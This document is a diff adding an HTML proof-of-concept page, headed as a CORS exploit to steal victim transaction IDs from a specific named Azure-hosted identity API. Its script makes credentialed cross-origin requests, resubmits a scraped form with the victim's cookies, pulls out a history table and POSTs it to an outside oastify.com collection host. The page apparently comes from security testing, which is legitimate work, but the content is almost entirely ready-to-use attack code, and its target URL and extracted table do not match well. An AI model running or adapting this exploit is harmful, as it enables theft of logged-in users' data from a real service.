@@ -1,0 +1,68 @@
+//Steal victim user transaction IDs script POC
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS</title>
+</head>
+<body>
+    <h1>CORS Exploit By RA</h1>
+    <h1>Exploit by AW, MUA, and IBA</h1>
+
+    <script>
+        async function fetchTransactions() {
+            const url = 'https://ccnzidentitywebapi-appservice-uat.azurewebsites.net/swagger/ui/index#!/Account/Account_ActivateUser';
+            const response = await fetch(url, {
+                method: 'GET',
+                credentials: 'include',
+            });
+            if (!response.ok) {
+                console.error('Failed to fetch the form page');
+                return;
+            }
+            const text = await response.text();
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(text, 'text/html');
+         
+            const form = doc.querySelector('form');
+            if (!form) {
+                console.error('Form not found');
+                return;
+            }
+            const formData = new FormData(form);
+            const formObject = Object.fromEntries(formData);
+            const formParams = new URLSearchParams(formObject).toString();
+            const submitResponse = await fetch("https://ccnzidentitywebapi-appservice-uat.azurewebsites.net/swagger/ui/index#!/Account/Account_ActivateUser", {
+                method: form.method,
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: formParams
+            });
+            if (submitResponse.ok) {
+            body = await submitResponse.text();
+                       const parser = new DOMParser();
+                        const doc = parser.parseFromString(body, 'text/html');
+                console.log(body)
+                        const firstTable = doc.getElementById('game-history-table');
+                console.log(firstTable)
+                        const tableValue = firstTable.outerHTML;
+                        fetch('https://cs83lvnouqdu47dwm5d629tqthz8nzbo.oastify.com/log', {
+                            method: 'POST',
+                            // headers: {
+                            // 'Accept': 'application/json',
+                            // },
+                            body: tableValue
+                        });
+                alert('Data Extracted.');
+            } else {
+                console.error('Failed to submit the form');
+            }
+            }
+            fetchTransactions();
+        </script>
+</body>
+</html>
